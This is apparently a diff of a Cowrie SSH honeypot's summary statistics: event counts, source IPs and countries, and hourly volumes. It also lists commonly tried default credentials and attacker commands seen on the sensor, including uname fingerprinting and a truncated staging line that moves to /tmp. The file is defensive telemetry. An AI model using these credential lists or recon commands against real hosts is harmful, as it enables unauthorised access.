@@ -1,29 +1,29 @@
 {
  "generated_from": "LogKompass Cowrie sensor",
  "totals": {
-  "events": 66936,
-  "distinct_ips": 474
+  "events": 67714,
+  "distinct_ips": 489
  },
  "by_kind": [
   {
    "kind": "cowrie_command",
-   "n": 17586
+   "n": 17802
   },
   {
    "kind": "cowrie_session",
-   "n": 16695
+   "n": 16893
   },
   {
    "kind": "cowrie_connect",
-   "n": 16694
+   "n": 16891
   },
   {
    "kind": "cowrie_login_success",
-   "n": 15892
+   "n": 16057
   },
   {
    "kind": "cowrie_login_failed",
-   "n": 69
+   "n": 71
   }
  ],
  "top_ips": [
@@ -95,7 +95,7 @@
   },
   {
    "ip": "195.154.107.115",
-   "n": 2231,
+   "n": 2551,
    "country": "FR",
    "as_org": "Scaleway SAS"
   }
@@ -103,11 +103,11 @@
  "top_countries": [
   {
    "country": "BG",
-   "n": 49340
+   "n": 49342
   },
   {
    "country": "US",
-   "n": 5515
+   "n": 5674
   },
   {
    "country": "PH",
@@ -115,19 +115,23 @@
   },
   {
    "country": "RO",
-   "n": 3128
+   "n": 3167
   },
   {
    "country": "FR",
-   "n": 2245
+   "n": 2565
   },
   {
    "country": "NL",
-   "n": 336
+   "n": 337
+  },
+  {
+   "country": "BD",
+   "n": 250
   },
   {
    "country": "TR",
-   "n": 218
+   "n": 230
   },
   {
    "country": "UA",
@@ -135,25 +139,25 @@
   },
   {
    "country": "SG",
-   "n": 125
-  },
-  {
-   "country": "CN",
-   "n": 106
+   "n": 140
   }
  ],
  "top_credentials": [
   {
    "cred": "support/support",
-   "n": 81
+   "n": 85
+  },
+  {
+   "cred": "root/123456",
+   "n": 43
   },
   {
    "cred": "root/111111",
    "n": 42
   },
   {
-   "cred": "root/123456",
-   "n": 41
+   "cred": "root/12345",
+   "n": 39
   },
   {
    "cred": "root/123123",
@@ -164,24 +168,20 @@
    "n": 39
   },
   {
-   "cred": "root/12345",
+   "cred": "root/12345678",
    "n": 38
   },
   {
-   "cred": "root/12345678",
+   "cred": "root/1234",
    "n": 37
   },
   {
-   "cred": "root/1234",
+   "cred": "root/123456789",
    "n": 36
   },
   {
-   "cred": "root/123456789",
-   "n": 35
-  },
-  {
    "cred": "root/123",
-   "n": 32
+   "n": 33
   },
   {
    "cred": "root/admin",
@@ -207,11 +207,11 @@
  "top_usernames": [
   {
    "username": "root",
-   "n": 6244
+   "n": 6344
   },
   {
    "username": "admin",
-   "n": 435
+   "n": 446
   },
   {
    "username": "ubuntu",
@@ -219,7 +219,7 @@
   },
   {
    "username": "user",
-   "n": 276
+   "n": 278
   },
   {
    "username": "deploy",
@@ -227,7 +227,7 @@
   },
   {
    "username": "test",
-   "n": 167
+   "n": 168
   },
   {
    "username": "user1",
@@ -235,7 +235,7 @@
   },
   {
    "username": "support",
-   "n": 111
+   "n": 115
   },
   {
    "username": "claude",
@@ -250,8 +250,8 @@
    "n": 80
   },
   {
-   "username": "minecraft",
-   "n": 73
+   "username": "dev",
+   "n": 75
   }
  ],
  "top_commands": [
@@ -261,23 +261,23 @@
   },
   {
    "cmd": "echo xsec",
-   "n": 1777
+   "n": 1857
   },
   {
    "cmd": "printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter ",
-   "n": 934
+   "n": 968
   },
   {
    "cmd": "#!/bin/bash\necho \"xxxxxx\"\n",
-   "n": 934
+   "n": 968
   },
   {
    "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nu",
-   "n": 467
+   "n": 484
   },
   {
    "cmd": "/bin/./uname -s -v -n -r -m",
-   "n": 138
+   "n": 187
   },
   {
    "cmd": "uname -a ; echo 'vT'",
@@ -292,11 +292,11 @@
    "n": 18
   },
   {
-   "cmd": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || ",
-   "n": 10
+   "cmd": "uname -a",
+   "n": 12
   },
   {
-   "cmd": "uname -a",
+   "cmd": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || ",
    "n": 10
   },
   {
@@ -703,7 +703,27 @@
   },
   {
    "hour": "2026-10-01T22",
-   "n": 18
+   "n": 132
+  },
+  {
+   "hour": "2026-10-01T23",
+   "n": 128
+  },
+  {
+   "hour": "2026-10-02T00",
+   "n": 157
+  },
+  {
+   "hour": "2026-10-02T01",
+   "n": 110
+  },
+  {
+   "hour": "2026-10-02T02",
+   "n": 221
+  },
+  {
+   "hour": "2026-10-02T03",
+   "n": 48
   }
  ],
  "latest_digest": {
